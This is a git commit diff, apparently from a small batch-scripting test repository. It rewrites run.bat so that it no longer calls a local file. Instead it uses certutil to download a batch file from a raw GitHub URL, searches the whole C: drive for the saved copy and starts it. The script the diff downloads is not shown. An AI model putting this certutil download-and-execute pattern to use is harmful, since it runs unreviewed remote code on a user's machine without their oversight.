8f1c93cd776dacf6fc0156a95bc31cdf9817182a
M48✌🚱 <100668901+Cher-IS-7@users.noreply.github.com>
2024-04-30 09:25:35 +0400

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,17 +1,22 @@
 @echo off
-setlocal enabledelayedexpansion
 
-set "targetFile=permission.bat"
-set "searchDir=%~dp0"
+REM Set the URL of the file you want to download
+set "url=https://raw.githubusercontent.com/Cher-IS-7/batch-testing/main/main.bat"
 
-for /r "%searchDir%" %%I in ("%targetFile%") do (
-    set "foundFile=%%~fI"
-    goto :execute
+REM Set the path where you want to save the downloaded file
+set "output=%CD%\res-main.bat"
+
+REM Download the file using certutil
+certutil -urlcache -split -f "%url%" "%output%"
+
+REM Notify the user that the download is complete
+echo File downloaded successfully.
+
+set "targetFile=res-main.bat"
+
+for /r C:\ %%f in (%targetFile%) do (
+    if exist "%%f" (
+        start "" "%%f"
+        exit /b
+    )
 )
-
-echo "%targetFile%" not found in "%searchDir%".
-exit /b
-
-:execute
-echo Running "%foundFile%"...
-call "%foundFile%"
